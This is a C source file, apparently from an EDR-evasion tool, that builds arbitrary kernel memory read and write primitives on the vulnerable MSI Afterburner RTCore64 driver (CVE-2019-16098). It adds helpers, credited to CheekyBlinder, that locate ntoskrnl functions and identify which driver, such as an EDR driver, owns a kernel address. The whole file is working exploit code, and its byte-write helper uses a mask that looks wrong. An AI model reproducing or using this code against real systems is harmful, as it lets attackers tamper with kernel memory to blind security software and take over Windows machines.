/*

--- Kernel memory Read / Write primitives through the vulnerable Micro-Star MSI Afterburner driver.
--- Source and credit: https://github.com/Barakat/CVE-2019-16098/blob/master/CVE-2019-16098.cpp

*/
#include <Windows.h>
#include <Tchar.h>
#include <Psapi.h>

#include "KernelMemoryPrimitives.h"

static_assert(sizeof(struct RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");
static_assert(sizeof(struct RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");
static_assert(sizeof(struct RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    struct RTCORE64_MEMORY_READ MemoryRead = { 0 };
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        NULL);

    return MemoryRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    struct RTCORE64_MEMORY_READ MemoryRead = { 0 };
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        NULL);
}

BYTE ReadMemoryBYTE(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 1, Address) & 0xff;
}

WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address) & 0xffffffff;
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return ((DWORD64)(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryBYTE(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    DWORD64 currentValue = ReadMemoryDWORD64(Device, Address);
    Value = (currentValue & 0xFFFFFFFFFFFFFFF0) | (Value);
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}

void WriteMemoryWORD(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    DWORD64 currentValue = ReadMemoryDWORD64(Device, Address);
    Value = (currentValue & 0xFFFFFFFFFFFFFF00) | (Value);
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}

/*

--- Kernel exploitation helpers.
--- Largely inspired from https://github.com/br-sn/CheekyBlinder
--- Source and credit: https://github.com/br-sn/CheekyBlinder/blob/master/CheekyBlinder/CheekyBlinder.cpp

*/

DWORD64 FindNtoskrnlBaseAddress(void) {
    DWORD cbNeeded = 0;
    LPVOID drivers[1024];

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        return (DWORD64)drivers[0];
    }

    return 0;
}

TCHAR* FindDriver(DWORD64 address, BOOL verbose) {

    LPVOID drivers[1024];
    DWORD cbNeeded;
    int cDrivers = 0;
    int i = 0;
    TCHAR szDriver[1024] = { 0 };
    DWORD64 minDiff = MAXDWORD64;
    DWORD64 diff;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        cDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < cDrivers; i++) {
            if ((DWORD64)drivers[i] <= address) {
                diff = address - (DWORD64)drivers[i];
                if (diff < minDiff) {
                    minDiff = diff;
                }
            }
        }
    }
    else {
        _tprintf(TEXT("[!] Could not resolve driver for 0x%I64x, an EDR driver might be missed\n"), address);
        return NULL;
    }

    if (GetDeviceDriverBaseName((LPVOID)(address - minDiff), szDriver, _countof(szDriver))) {

        if (verbose) {
            _tprintf(TEXT("[+] %016llx [%s + 0x%llx]\n"), address, szDriver, minDiff);
        }

        TCHAR* const ptrDrvier = (LPTSTR)calloc(1024, sizeof(TCHAR));

        if (!ptrDrvier) {
            _tprintf(TEXT("[!] Couldn't allocate memory to retrieve the driver pointer\n"));
            return NULL;
        }

        _tcscpy_s(ptrDrvier, 1024, szDriver);
        return ptrDrvier;
    }
    else {
        _tprintf(TEXT("[!] Could not resolve driver for 0x%I64x, an EDR driver might be missed\n"), address);
        return NULL;
    }
}

HANDLE GetDriverHandle() {
    TCHAR service[] = TEXT("\\\\.\\RTCore64");
    HANDLE Device = CreateFile(service, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        
    if (Device == INVALID_HANDLE_VALUE) {
        _tprintf(TEXT("[!] Unable to obtain a handle to the vulnerable driver, exiting...\n"));
        exit(EXIT_FAILURE);
    }

    return Device;
}

DWORD64 GetFunctionAddress(LPCSTR function) {
    DWORD64 ntoskrnlBaseAddress = FindNtoskrnlBaseAddress();
    DWORD64 address = 0;
    HMODULE ntoskrnl = LoadLibrary(TEXT("ntoskrnl.exe"));
    if (ntoskrnl) {
        DWORD64 offset = (DWORD64)(GetProcAddress(ntoskrnl, function)) - (DWORD64)(ntoskrnl);
        address = ntoskrnlBaseAddress + offset;
        FreeLibrary(ntoskrnl);
    }
    // _tprintf(TEXT("[+] %s address: 0x%I64x\n"), function, address);
    return address;
}